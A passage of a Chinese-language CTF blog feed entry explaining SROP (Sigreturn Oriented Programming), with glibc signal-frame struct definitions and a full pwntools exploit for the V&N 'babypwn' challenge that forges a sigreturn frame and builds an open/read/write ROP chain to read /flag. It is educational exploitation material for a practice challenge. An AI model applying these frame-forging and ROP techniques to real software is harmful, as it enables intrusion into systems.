class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
